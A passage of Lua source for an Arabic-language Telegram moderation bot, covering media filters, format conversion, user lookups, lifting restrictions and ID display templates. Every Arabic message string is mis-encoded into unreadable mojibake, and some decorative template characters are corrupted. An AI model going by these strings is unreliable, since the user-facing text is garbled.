local idsticker = result.content_.sticker_.sticker_.persistent_id_
Devmfm:srem(mustafa.."mfm:FilterSteckr"..msg.chat_id_,idsticker)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุงูุบุงุก ููุน ุงูููุตู ูููููู ุงุฑุณุงูู ุงูุงู', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
Devmfm:srem(mustafa.."mfm:FilterPhoto"..msg.chat_id_,photo)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุงูุบุงุก ููุน ุงูุตูุฑู ูููููู ุงุฑุณุงููุง ุงูุงู', 1, 'md')
return false
end
if result.content_.animation_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
Devmfm:srem(mustafa.."mfm:FilterAnimation"..msg.chat_id_,idanimation)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุงูุบุงุก ููุน ุงููุชุญุฑูู ูููููู ุงุฑุณุงููุง ุงูุงู', 1, 'md')
return false
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unfilter_by_reply) 
end
end
if text and (text == "ุชูุนูู ุชุญููู ุงูุตูุบ" or text == "ุชูุนูู ุงูุชุญููู") and Manager(msg) and ChCheck(msg) then
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชูุนูู ุชุญููู ุงูุตูุบ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Thwel:mfm'..msg.chat_id_) 
end
if text and (text == "ุชุนุทูู ุชุญููู ุงูุตูุบ" or text == "ุชุนุทูู ุงูุชุญููู") and Manager(msg) and ChCheck(msg) then
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชุนุทูู ุชุญููู ุงูุตูุบ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Thwel:mfm'..msg.chat_id_,true)  
end
if text == 'ุชุญููู' and not Devmfm:get(mustafa..'mfm:Thwel:mfm'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then 
function ThwelByReply(extra, result, success)
if result.content_.photo_ then 
local mfm = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.photo_.sizes_[1].photo_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..mfm.result.file_path,msg.sender_user_id_..'.png') 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.png')
os.execute('rm -rf ./'..msg.sender_user_id_..'.png') 
end   
if result.content_.sticker_ then 
local mfm = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.sticker_.sticker_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..mfm.result.file_path,msg.sender_user_id_..'.jpg') 
sendPhoto(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.jpg','โ๏ธุชู ุชุญููู ุงูููุตู ุงูู ุตูุฑู')     
os.execute('rm -rf ./'..msg.sender_user_id_..'.jpg') 
end
if result.content_.audio_ then 
local mfm = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.audio_.audio_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..mfm.result.file_path,msg.sender_user_id_..'.ogg') 
sendVoice(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.ogg',"โ๏ธุชู ุชุญููู ุงููMp3 ุงูู ุจุตูู")
os.execute('rm -rf ./'..msg.sender_user_id_..'.ogg') 
end   
if result.content_.voice_ then 
local mfm = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.voice_.voice_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..mfm.result.file_path,msg.sender_user_id_..'.mp3') 
sendAudio(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.mp3')  
os.execute('rm -rf ./'..msg.sender_user_id_..'.mp3') 
end
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ThwelByReply) 
end
end
if text ==("ูุดู") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) or text ==("ุงูุฏู") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) then 
function id_by_reply(extra, result, success) 
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local user_msgs = Devmfm:get(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..data.id_) or 0
local user_nkt = tonumber(Devmfm:get(mustafa..'mfm:GamesNumber'..msg.chat_id_..data.id_) or 0)
if Devmfm:sismember(mustafa..'mfm:BanAll:',result.sender_user_id_) then
Tkeed = 'ูุญุธูุฑ ุนุงู'
elseif Devmfm:sismember(mustafa..'mfm:MuteAll:',result.sender_user_id_) then
Tkeed = 'ููุชูู ุนุงู'
elseif Devmfm:sismember(mustafa..'mfm:Ban:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'ูุญุธูุฑ'
elseif Devmfm:sismember(mustafa..'mfm:Muted:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'ููุชูู'
elseif Devmfm:sismember(mustafa..'mfm:Tkeed:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'ูููุฏ'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\nโ๏ธุงููููุฏ โซ '..Tkeed
else 
Tked = '' 
end
if Devmfm:sismember(mustafa..'mfm:SudoBot:',result.sender_user_id_) and SudoBot(msg) then
sudobot = '\nโ๏ธุนุฏุฏ ุงููุฑูุจุงุช โซ '..(Devmfm:get(mustafa..'mfm:Sudos'..result.sender_user_id_) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(result.sender_user_id_,msg.chat_id_) ~= false then
CustomTitle = '\nโ๏ธููุจู โซ '..GetCustomTitle(result.sender_user_id_,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then 
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธุงูุญุณุงุจ ูุญุฐูู', 1, 'md')
return false  end
if data.username_ == false then
Text = 'โ๏ธุงุณูู โซ ['..CatchName(data.first_name_,20)..'](tg://user?id='..result.sender_user_id_..')\nโ๏ธุงูุฏูู โซ โจ `'..result.sender_user_id_..'` โฉ\nโ๏ธุฑุชุจุชู โซ '..IdRank(result.sender_user_id_, msg.chat_id_)..''..sudobot..'\nโ๏ธุฑุณุงุฆูู โซ โจ '..user_msgs..' โฉ\nโ๏ธุชูุงุนูู โซ '..formsgs(user_msgs)..''..CustomTitle..'\nโ๏ธููุงุทู โซ โจ '..user_nkt..' โฉ'..Tked
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธูุนุฑูู โซ [@'..data.username_..']\nโ๏ธุงูุฏูู โซ โจ `'..result.sender_user_id_..'` โฉ\nโ๏ธุฑุชุจุชู โซ '..IdRank(result.sender_user_id_, msg.chat_id_)..''..sudobot..'\nโ๏ธุฑุณุงุฆูู โซ โจ '..user_msgs..' โฉ\nโ๏ธุชูุงุนูู โซ '..formsgs(user_msgs)..''..CustomTitle..'\nโ๏ธููุงุทู โซ โจ '..user_nkt..' โฉ'..Tked, 1, 'md')
end
end,nil)
end 
getMessage(msg.chat_id_, msg.reply_to_message_id_,id_by_reply) 
end
if text and text:match('^ูุดู @(.*)') and ChCheck(msg) or text and text:match('^ุงูุฏู @(.*)') and ChCheck(msg) then 
local username = text:match('^ูุดู @(.*)') or text:match('^ุงูุฏู @(.*)')
tdcli_function ({ID = "SearchPublicChat",username_ = username},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
return false  end
if res.type_.ID == "ChannelChatInfo" then 
if res.type_.channel_.is_supergroup_ == false then
local ch = 'ููุงุฉ'
local chn = 'โ๏ธููุน ุงูุญุณุงุจ โซ โจ '..ch..' โฉ\nโ๏ธุงูุงูุฏู โซ โจ `'..res.id_..'` โฉ\nโ๏ธุงููุนุฑู โซ โจ [@'..username..'] โฉ\nโ๏ธุงูุงุณู โซ โจ ['..res.title_..'] โฉ'
Dev_mfm(msg.chat_id_, msg.id_, 1,chn, 1, 'md')
else
local gr = 'ูุฌููุนู'
local grr = 'โ๏ธููุน ุงูุญุณุงุจ โซ โจ '..gr..' โฉ\nโ๏ธุงูุงูุฏู โซ โจ '..res.id_..' โฉ\nโ๏ธุงููุนุฑู โซ โจ [@'..username..'] โฉ\nโ๏ธุงูุงุณู โซ โจ ['..res.title_..'] โฉ'
Dev_mfm(msg.chat_id_, msg.id_, 1,grr, 1, 'md')
end
return false  end
if res.id_ then  
tdcli_function ({ID = "GetUser",user_id_ = res.id_},function(arg,data) 
local user_msgs = Devmfm:get(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..res.id_) or 0
local user_nkt = tonumber(Devmfm:get(mustafa..'mfm:GamesNumber'..msg.chat_id_..res.id_) or 0)
if Devmfm:sismember(mustafa..'mfm:BanAll:',res.id_) then
Tkeed = 'ูุญุธูุฑ ุนุงู'
elseif Devmfm:sismember(mustafa..'mfm:MuteAll:',res.id_) then
Tkeed = 'ููุชูู ุนุงู'
elseif Devmfm:sismember(mustafa..'mfm:Ban:'..msg.chat_id_,res.id_) then
Tkeed = 'ูุญุธูุฑ'
elseif Devmfm:sismember(mustafa..'mfm:Muted:'..msg.chat_id_,res.id_) then
Tkeed = 'ููุชูู'
elseif Devmfm:sismember(mustafa..'mfm:Tkeed:'..msg.chat_id_,res.id_) then
Tkeed = 'ูููุฏ'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\nโ๏ธุงููููุฏ โซ '..Tkeed
else 
Tked = '' 
end
if Devmfm:sismember(mustafa..'mfm:SudoBot:',res.id_) and SudoBot(msg) then
sudobot = '\nโ๏ธุนุฏุฏ ุงููุฑูุจุงุช โซ '..(Devmfm:get(mustafa..'mfm:Sudos'..res.id_) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(res.id_,msg.chat_id_) ~= false then
CustomTitle = '\nโ๏ธููุจู โซ '..GetCustomTitle(res.id_,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธุงูุญุณุงุจ ูุญุฐูู', 1, 'md')
return false  end
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธูุนุฑูู โซ [@'..data.username_..']\nโ๏ธุงูุฏูู โซ โจ `'..res.id_..'` โฉ\nโ๏ธุฑุชุจุชู โซ '..IdRank(res.id_, msg.chat_id_)..''..sudobot..'\nโ๏ธุฑุณุงุฆูู โซ โจ '..user_msgs..' โฉ\nโ๏ธุชูุงุนูู โซ '..formsgs(user_msgs)..''..CustomTitle..'\nโ๏ธููุงุทู โซ โจ '..user_nkt..' โฉ'..Tked, 1, 'md')
end,nil)
end 
end,nil)
return false 
end
if text and text:match('ูุดู (%d+)') and ChCheck(msg) or text and text:match('ุงูุฏู (%d+)') and ChCheck(msg) then 
local iduser = text:match('ูุดู (%d+)') or text:match('ุงูุฏู (%d+)')  
tdcli_function ({ID = "GetUser",user_id_ = iduser},function(arg,data) 
if data.message_ == "User not found" then
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธูู ูุชู ุงูุชุนุฑู ุนูู ุงูุญุณุงุจ', 1, 'md')
return false  
end
local user_msgs = Devmfm:get(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..iduser) or 0
local user_nkt = tonumber(Devmfm:get(mustafa..'mfm:GamesNumber'..msg.chat_id_..iduser) or 0)
if Devmfm:sismember(mustafa..'mfm:BanAll:',iduser) then
Tkeed = 'ูุญุธูุฑ ุนุงู'
elseif Devmfm:sismember(mustafa..'mfm:MuteAll:',iduser) then
Tkeed = 'ููุชูู ุนุงู'
elseif Devmfm:sismember(mustafa..'mfm:Ban:'..msg.chat_id_,iduser) then
Tkeed = 'ูุญุธูุฑ'
elseif Devmfm:sismember(mustafa..'mfm:Muted:'..msg.chat_id_,iduser) then
Tkeed = 'ููุชูู'
elseif Devmfm:sismember(mustafa..'mfm:Tkeed:'..msg.chat_id_,iduser) then
Tkeed = 'ูููุฏ'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\nโ๏ธุงููููุฏ โซ '..Tkeed
else 
Tked = '' 
end
if Devmfm:sismember(mustafa..'mfm:SudoBot:',iduser) and SudoBot(msg) then
sudobot = '\nโ๏ธุนุฏุฏ ุงููุฑูุจุงุช โซ '..(Devmfm:get(mustafa..'mfm:Sudos'..iduser) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(iduser,msg.chat_id_) ~= false then
CustomTitle = '\nโ๏ธููุจู โซ '..GetCustomTitle(iduser,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธุงูุญุณุงุจ ูุญุฐูู', 1, 'md')
return false  end
if data.username_ == false then
Text = 'โ๏ธุงุณูู โซ ['..CatchName(data.first_name_,20)..'](tg://user?id='..iduser..')\nโ๏ธุงูุฏูู โซ โจ `'..iduser..'` โฉ\nโ๏ธุฑุชุจุชู โซ '..IdRank(data.id_, msg.chat_id_)..''..sudobot..'\nโ๏ธุฑุณุงุฆูู โซ โจ '..user_msgs..' โฉ\nโ๏ธุชูุงุนูู โซ '..formsgs(user_msgs)..''..CustomTitle..'\nโ๏ธููุงุทู โซ โจ '..user_nkt..' โฉ'..Tked
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธูุนุฑูู โซ [@'..data.username_..']\nโ๏ธุงูุฏูู โซ โจ `'..iduser..'` โฉ\nโ๏ธุฑุชุจุชู โซ '..IdRank(data.id_, msg.chat_id_)..''..sudobot..'\nโ๏ธุฑุณุงุฆูู โซ โจ '..user_msgs..' โฉ\nโ๏ธุชูุงุนูู โซ '..formsgs(user_msgs)..''..CustomTitle..'\nโ๏ธููุงุทู โซ โจ '..user_nkt..' โฉ'..Tked, 1, 'md')
end
end,nil)
return false 
end 
if text == 'ูุดู ุงููููุฏ' and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg) and ChCheck(msg) then 
function kshf_by_reply(extra, result, success)
if Devmfm:sismember(mustafa..'mfm:Muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'ููุชูู' else muted = 'ุบูุฑ ููุชูู' end
if Devmfm:sismember(mustafa..'mfm:Ban:'..msg.chat_id_,result.sender_user_id_) then banned = 'ูุญุธูุฑ' else banned = 'ุบูุฑ ูุญุธูุฑ' end
if Devmfm:sismember(mustafa..'mfm:BanAll:',result.sender_user_id_) then banall = 'ูุญุธูุฑ ุนุงู' else banall = 'ุบูุฑ ูุญุธูุฑ ุนุงู' end
if Devmfm:sismember(mustafa..'mfm:MuteAll:',result.sender_user_id_) then muteall = 'ููุชูู ุนุงู' else muteall = 'ุบูุฑ ููุชูู ุนุงู' end
if Devmfm:sismember(mustafa..'mfm:Tkeed:',result.sender_user_id_) then tkeed = 'ูููุฏ' else tkeed = 'ุบูุฑ ูููุฏ' end
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุญุธุฑ ุงูุนุงู โซ '..banall..'\nโ๏ธุงููุชู ุงูุนุงู โซ '..muteall..'\nโ๏ธุงูุญุธุฑ โซ '..banned..'\nโ๏ธุงููุชู โซ '..muted..'\nโ๏ธุงูุชููุฏ โซ '..tkeed..'', 1, 'md')  
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kshf_by_reply) 
end
if text and text:match('^ูุดู ุงููููุฏ @(.*)') and Admin(msg) and ChCheck(msg) then 
local username = text:match('^ูุดู ุงููููุฏ @(.*)') 
function kshf_by_username(extra, result, success)
if result.id_ then
if Devmfm:sismember(mustafa..'mfm:Muted:'..msg.chat_id_,result.id_) then muted = 'ููุชูู' else muted = 'ุบูุฑ ููุชูู' end
if Devmfm:sismember(mustafa..'mfm:Ban:'..msg.chat_id_,result.id_) then banned = 'ูุญุธูุฑ' else banned = 'ุบูุฑ ูุญุธูุฑ' end
if Devmfm:sismember(mustafa..'mfm:BanAll:',result.id_) then banall = 'ูุญุธูุฑ ุนุงู' else banall = 'ุบูุฑ ูุญุธูุฑ ุนุงู' end
if Devmfm:sismember(mustafa..'mfm:MuteAll:',result.id_) then muteall = 'ููุชูู ุนุงู' else muteall = 'ุบูุฑ ููุชูู ุนุงู' end
if Devmfm:sismember(mustafa..'mfm:Tkeed:',result.id_) then tkeed = 'ูููุฏ' else tkeed = 'ุบูุฑ ูููุฏ' end
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุญุธุฑ ุงูุนุงู โซ '..banall..'\nโ๏ธุงููุชู ุงูุนุงู โซ '..muteall..'\nโ๏ธุงูุญุธุฑ โซ '..banned..'\nโ๏ธุงููุชู โซ '..muted..'\nโ๏ธุงูุชููุฏ โซ '..tkeed..'', 1, 'md')  
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')  
end
end
resolve_username(username,kshf_by_username) 
end
if text == 'ุฑูุน ุงููููุฏ' and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg) and ChCheck(msg) then 
function unbanreply(extra, result, success) 
if tonumber(result.sender_user_id_) == tonumber(mustafa) then  
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุง ุงูุจูุช ูููุณ ูุฏู ูููุฏ', 1, 'md')  
return false  
end 
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุฑูุน ูููุฏู")  
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
Devmfm:srem(mustafa..'mfm:Tkeed:'..msg.chat_id_,result.sender_user_id_) Devmfm:srem(mustafa..'mfm:Ban:'..msg.chat_id_,result.sender_user_id_) Devmfm:srem(mustafa..'mfm:Muted:'..msg.chat_id_,result.sender_user_id_)   
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) 
end
if text and text:match('^ุฑูุน ุงููููุฏ (%d+)') and Admin(msg) and ChCheck(msg) then 
local user = text:match('ุฑูุน ุงููููุฏ (%d+)') 
if tonumber(user) == tonumber(mustafa) then  
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุง ุงูุจูุช ูููุณ ูุฏู ูููุฏ', 1, 'md')  
return false  
end 
tdcli_function ({ID = "GetUser",user_id_ = user},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูู ุงุณุชุทุน ุงุณุชุฎุฑุงุฌ ุงููุนูููุงุช', 1, 'md') 
return false  
end
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุฑูุน ูููุฏู")  
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
Devmfm:srem(mustafa..'mfm:Tkeed:'..msg.chat_id_,user) Devmfm:srem(mustafa..'mfm:Ban:'..msg.chat_id_,user) Devmfm:srem(mustafa..'mfm:Muted:'..msg.chat_id_,user)   
end,nil)  
end
if text and text:match('^ุฑูุน ุงููููุฏ @(.*)') and Admin(msg) and ChCheck(msg) then  
local username = text:match('ุฑูุน ุงููููุฏ @(.*)')  
function unbanusername(extra,result,success)  
if result and result.message_ and result.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')  
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.ID == "Channel" then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุฐุง ูุนุฑู ููุงุฉ ูููุณ ูุนุฑู ุญุณุงุจ', 1, 'md') 
return false  
end
if tonumber(result.id_) == tonumber(mustafa) then  
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุง ุงูุจูุช ูููุณ ูุฏู ูููุฏ', 1, 'md')  
return false  
end 
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูู ุงุณุชุทุน ุงุณุชุฎุฑุงุฌ ุงููุนูููุงุช', 1, 'md') 
return false  
end
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุฑูุน ูููุฏู")  
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
Devmfm:srem(mustafa..'mfm:Tkeed:'..msg.chat_id_,result.id_) Devmfm:srem(mustafa..'mfm:Ban:'..msg.chat_id_,result.id_) Devmfm:srem(mustafa..'mfm:Muted:'..msg.chat_id_,result.id_)   
end,nil)   
end  
resolve_username(username,unbanusername) 
end 
if Manager(msg) then
if text and text:match("^ุชุบููุฑ ุงูุงูุฏู$") and ChCheck(msg) or text and text:match("^ุชุบูุฑ ุงูุงูุฏู$") and ChCheck(msg) then 
local List = {
[[
ใ?๐๐๐ด๐ ๐จ #username ๐ฅฒ .
ใ?๐ผ๐๐ถ ๐จ #msgs ๐ฅฒ .
ใ?๐๐๐ฐ ๐จ #stast ๐ฅฒ .
ใ?๐ธ๐ณ ๐จ #id ๐ฅฒ .
]],
[[
โญ- ๐๐๐๐ #stast ๐ฏ. ๐
โฎ- ๐๐๐๐๐ #username ๐ฏ. ๐
โญ- ๐๐๐๐๐ #msgs ๐ฏ. ๐
โญ- ๐๐ ๐ #id ๐ฏ. ๐
]],
[[
โ ๐ฐ ๐พ๐๐๐๐๐๐ ๐ป๐ ๐ฎ๐๐๐๐ โ
โข ๐ค | ๐ผ๐ฌ๐บ : #username โโโโ
โข ๐ค | ๐บ๐ป๐จ : #stast ๐ง๐ปโโ๏ธ โฅ
โข ๐ค | ๐ฐ๐ซ : #id โโโโ
โข ๐ค | ๐ด๐บ๐ฎ : #msgs ๐
]],
[[
โ ๐๐๐๐ ๐คฑ #username ๐ฆด .
โ ๐๐๐ ๐คฑ #msgs ๐ฆด .
โ ๐๐๐ ๐คฑ #stast ๐ฆด .
โ ๐๐ ๐คฑ #id ๐ฆด .
]],
[[
๐ผ๐ฎ๐ถ ๐ผ๐๐๐๐ต๐๐๐ : #username 
๐ผ๐ฎ๐ถ ๐บ๐๐๐๐ : #stast 
๐ผ๐ฎ๐ถ ๐๐ : #id 
๐ผ๐ฎ๐ถ ๐ฎ๐๐๐๐บ : #game 
๐ผ๐ฎ๐ถ ๐ด๐๐๐ : #msgs
]],
[[
โ: ๐๐๐๐ #stast ๐ฏโธ๐.
โ: ๐๐๐๐๐ #username ๐ฏโธ๐.
โ: ๐๐๐๐๐ #msgs ๐ฏโธ๐.
โ: ๐๐ ๐ #id ๐ฏโธ๐.
]],
[[
โโข๐ฎ๐ฌ๐๐ซ : #username ๐ฃฌ  
โโข๐ฆ๐ฌ๐?  : #msgs ๐ฃฌ 
โโข๐ฌ๐ญ๐ : #stast ๐ฃฌ 
โโข๐ข๐  : #id ๐ฃฌ
]],
[[
- ๐ฌ ๐๐ฌ๐๐ซ : #username ๐ .
- ๐ฌ ๐๐ฌ๐  : #msgs ๐ .
- ๐ฌ ๐๐ญ๐ : #stast ๐ .
- ๐ฌ ๐๐ : #id ๐ .
]],
[[
.๐ฃ ๐ช๐จ๐๐ง๐ฃ๐๐ข๐ , #username  
.๐ฃ ๐จ๐ฉ๐๐จ๐ฉ , #stast  
.๐ฃ ๐ก๐ฟ , #id  
.๐ฃ ๐๐๐ข๐จ , #game 
.๐ฃ ๐ข๐จ๐๐จ , #msgs
]],
[[
โ๏ธ๐๐๐๐ โฌ #username 
โ๏ธ๐๐ โฌ #id
โ๏ธ๐๐๐๐๐ โฌ #stast
โ๏ธ๐๐๐๐ โฌ #cont 
โ๏ธ๐๐๐๐ โฌ #msgs
โ๏ธ๐๐๐๐ โฌ #game
]],
[[
แฏ ๐จ๐ฆ๐๐ฅ๐ก๐ฎ๐บ๐ . #username ๐บ๐ธ ๊ฐ
แฏ ๐ฆ๐ง๐ฎ๐ฆ๐ง . #stast ๐บ๐ธ ๊ฐ
แฏ ๐๐ . #id ๐บ๐ธ ๊ฐ
แฏ ๐๐ฎ๐บ๐๐ฆ . #game ๐บ๐ธ ๊ฐ
แฏ ๐บ๐ฆ๐๐ฆ . #msgs ๐บ๐ธ ๊ฐ
]],
[[
- แดัแดสษดแดแดแด โฅโข #username .
- แดัษขั โฅโข #msgs .
- ัแดแดแดั โฅโข #stast .
- สแดแดส ษชแด โฅโข #id  .
- แดแดษชแด แดsษข โฅโข #edit .
- แดแดแดแดษชสs โฅโข #auto . 
- ษขแดแดแด โฅโข #game .
]]}
local Text_Rand = List[math.random(#List)]
Devmfm:set(mustafa.."mfm:GpIds:Text"..msg.chat_id_,Text_Rand)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุชุบูุฑ ูููุดุฉ ุงูุงูุฏู")  
end
if SecondSudo(msg) then
if text and text:match("^ุชุนููู ุงูุงูุฏู ุงูุนุงู$") or text and text:match("^ุชุนูู ุงูุงูุฏู ุงูุนุงู$") or text and text:match("^ุชุนููู ูููุดุฉ ุงูุงูุฏู$") then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุฑุฌุงุฆุง ุงุชุจุน ุงูุชุนูููุงุช ููุชุนููู \nโ๏ธูุทุจุน ูููุดุฉ ุงูุงูุฏู ุงุฑุณู ูููุดู ุชุญุชูู ุนูู ุงููุตูุต ุงูุชู ุจุงููุบู ุงูุงูุฌููุฒูู ุงุฏูุงู โซ โค\nโ โ โ โ โ โ โ โ โ\n `#username` โฌ ูุทุจุน ุงููุนุฑู\n `#id` โฌ ูุทุจุน ุงูุงูุฏู \n `#photos` โฌ ูุทุจุน ุนุฏุฏ ุงูุตูุฑ \n `#stast` โฌ ูุทุจุน ุงูุฑุชุจ \n `#msgs` โฌ ูุทุจุน ุนุฏุฏ ุงูุฑุณุงุฆู \n `#msgday` โฌ ูุทุจุน ุงูุฑุณุงุฆู ุงูููููู \n `#CustomTitle` โฌ ูุทุจุน ุงูููุจ \n `#bio` โฌ ูุทุจุน ุงูุจุงูู \n `#auto` โฌ ูุทุจุน ุงูุชูุงุนู \n `#game` โฌ ูุทุจุน ุนุฏุฏ ุงูููุงุท \n `#cont` โฌ ูุทุจุน ุนุฏุฏ ุงูุฌูุงุช \n `#edit` โฌ ูุทุจุน ุนุฏุฏ ุงูุณุญูุงุช \n `#Description` โฌ ูุทุจุน ุชุนููู ุงูุตูุฑ\nโ โ โ โ โ โ โ โ โ', 1, 'md')
Devmfm:set("mustafa:New:id:"..mustafa..msg.sender_user_id_,'mustafaTEAM')
return "mustafaTEAM"
end
if text and Devmfm:get("mustafa:New:id:"..mustafa..msg.sender_user_id_) then 
if text == 'ุงูุบุงุก' then   
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุงูุบุงุก ุญูุธ ูููุดุฉ ุงูุงูุฏู', 1, 'md')
Devmfm:del("mustafa:New:id:"..mustafa..msg.sender_user_id_)
return false
end
Devmfm:del("mustafa:New:id:"..mustafa..msg.sender_user_id_)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุญูุธ ูููุดุฉ ุงูุงูุฏู ุงูุนุงูู', 1, 'md')
Devmfm:set(mustafa.."mfm:AllIds:Text",text)
return false
end
if text and text:match("^ุญุฐู ุงูุงูุฏู ุงูุนุงู$") or text and text:match("^ูุณุญ ุงูุงูุฏู ุงูุนุงู$") or text and text:match("^ุญุฐู ูููุดุฉ ุงูุงูุฏู$") then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุญุฐู ูููุดุฉ ุงูุงูุฏู ุงูุนุงูู")  
Devmfm:del(mustafa.."mfm:AllIds:Text")
end
end
if text and text:match("^ุชุนููู ุงูุงูุฏู$") and ChCheck(msg) or text and text:match("^ุชุนูู ุงูุงูุฏู$") and ChCheck(msg) then
